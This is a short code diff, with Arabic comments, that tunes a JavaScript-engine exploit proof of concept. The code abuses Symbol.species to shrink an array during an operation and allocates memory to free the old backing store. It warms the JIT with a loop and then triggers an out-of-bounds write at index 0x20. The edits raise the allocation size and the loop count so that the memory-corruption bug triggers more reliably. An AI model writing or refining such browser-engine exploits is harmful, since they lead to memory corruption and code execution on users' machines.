@@ -14,7 +14,7 @@ class SoSpecial extends Array {
             if (Trigger) {
                 Arr.length = 0;
                 alert('Length set to 0 by Symbol.species, Arr.length = ' + Arr.length);
-                let temp = new Array(1000000).fill(0);
+                let temp = new Array(2000000).fill(0); // زيادة الحجم لتحرير أكبر
             }
         };
     }
@@ -24,13 +24,13 @@ function main() {
     const Snowflake = new SoSpecial();
     Arr = new Array(0x21);
     Arr.fill(0);
-    for (let Idx = 0; Idx < 0x400; Idx++) {
+    for (let Idx = 0; Idx < 0x800; Idx++) { // زيادة التكرارات
         Target(Snowflake, 0, Idx);
     }
     Trigger = true;
     Target(Snowflake, 0x20, 0xBB);
     alert('Final Arr[0x20] = ' + Arr[0x20].toString(16));
-    alert('Arr.length = ' + Arr.length); // مراقبة الطول النهائي
+    alert('Arr.length = ' + Arr.length);
 }
 
 main();
